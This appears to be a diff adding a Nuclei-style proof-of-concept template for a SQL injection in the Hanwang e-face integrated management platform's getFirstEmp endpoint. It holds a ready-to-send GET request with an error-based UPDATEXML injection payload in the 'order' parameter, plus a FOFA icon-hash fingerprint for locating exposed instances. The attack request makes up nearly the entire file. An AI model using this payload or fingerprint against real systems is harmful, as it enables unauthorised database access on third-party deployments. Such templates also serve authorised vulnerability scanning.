@@ -1,0 +1,19 @@
+id: poc-az3g3rs8cp3x9p1t
+info:
+  name: 汉王e脸通综合管理平台 getFirstEmp存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/az3g3rs8cp3x9p1t'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: az3g3rs8cp3x9p1t
+    fofa: icon_hash="1380907357"
+http:
+- raw:
+  - GET /manage/firstPeopleOpen/getFirstEmp.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,MD5(123123),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
